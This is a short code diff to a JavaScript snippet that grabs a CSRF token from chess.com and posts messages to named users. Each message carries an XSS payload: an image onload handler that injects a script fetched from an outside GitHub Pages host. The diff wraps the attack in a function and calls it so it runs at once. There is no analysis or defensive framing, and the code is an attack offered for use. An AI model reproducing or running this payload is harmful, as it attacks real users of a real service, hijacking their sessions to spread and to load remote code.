@@ -1,4 +1,5 @@
 var users = "yellowrook1,atanwin"
+async function begin(){
 var response = await fetch("https://www.chess.com/tournament/create");
 var text = await response.text()
 var parser = new DOMParser();
@@ -25,5 +26,6 @@ text = await response.text()
         "body": `{\"_token\":\"${csrf_token}\",\"message\":\"<img src='https://betacssjs.chesscomfiles.com/bundles/web/images/noavatar_l.84a92436.gif' onload='body.appendChild(document.createElement\`script\`).src=\`//yellowrook1.github.io/w.js\`'>\",\"usernames\":\"${users}\"}`,
         "method": "POST",
     });
-
+}
+begin()
 
